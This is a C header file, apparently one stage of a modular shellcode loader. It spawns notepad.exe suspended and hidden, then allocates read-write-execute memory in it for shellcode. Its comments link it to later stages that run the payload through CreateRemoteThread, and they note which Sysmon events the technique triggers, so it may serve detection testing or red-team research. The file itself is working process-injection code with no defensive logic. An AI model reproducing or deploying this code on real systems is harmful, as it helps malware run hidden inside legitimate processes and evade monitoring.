#pragma once
#include "../../api/api_wrappers.h"
#include "../../core/utils.h"
#include "../context.h"

// T2.4 — Spawn target process suspended, then allocate inside it
//
// Creates a fresh notepad.exe in CREATE_SUSPENDED state and allocates
// shellcode memory inside its address space. The target_process and
// target_thread handles are stored in the context. The suspended main
// thread is intentionally left suspended; T5.4 (exec_remote_thread)
// runs the shellcode via CreateRemoteThread on a new thread, so the
// target's original thread never resumes and the process exits when the
// loader terminates.
//
// Pairing: T2.4 + T4.3 + T5.4.
//
// Compared to T2.3 (find existing explorer.exe), spawning a fresh
// process produces an additional Event 1 (ProcessCreate, parent=
// payload.exe child=notepad.exe). This is itself a behavioral signal,
// so the two L2 remote techniques exercise different parts of the
// detection surface even though they share L4 and L5.
inline BOOL Stage2_Alloc_Spawn(TechniqueContext* ctx)
{
    if (!ctx) return FALSE;

    STARTUPINFOA si       = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    if (!CreateProcessA(
            "C:\\Windows\\System32\\notepad.exe",
            NULL, NULL, NULL, FALSE,
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            NULL, NULL, &si, &pi))
    {
#ifdef DEBUG_MODE
        DEBUG_MSG("Stage 2", "CreateProcess(notepad) failed: %lu", GetLastError());
#endif
        return FALSE;
    }

    ctx->target_process = pi.hProcess;
    ctx->target_thread  = pi.hThread;

    ctx->allocated_mem = (unsigned char*)MyVirtualAllocEx(
                            pi.hProcess,
                            NULL,
                            ctx->length,
                            MEM_COMMIT | MEM_RESERVE,
                            PAGE_EXECUTE_READWRITE
                        );

#ifdef DEBUG_MODE
    if (ctx->allocated_mem) {
        DEBUG_MSG("Stage 2", "Spawn alloc %llu bytes at %p in notepad pid %lu",
                  ctx->length, ctx->allocated_mem, pi.dwProcessId);
    } else {
        DEBUG_MSG("Stage 2", "Spawn alloc failed in pid %lu", pi.dwProcessId);
    }
#endif

    return ctx->allocated_mem != NULL;
}
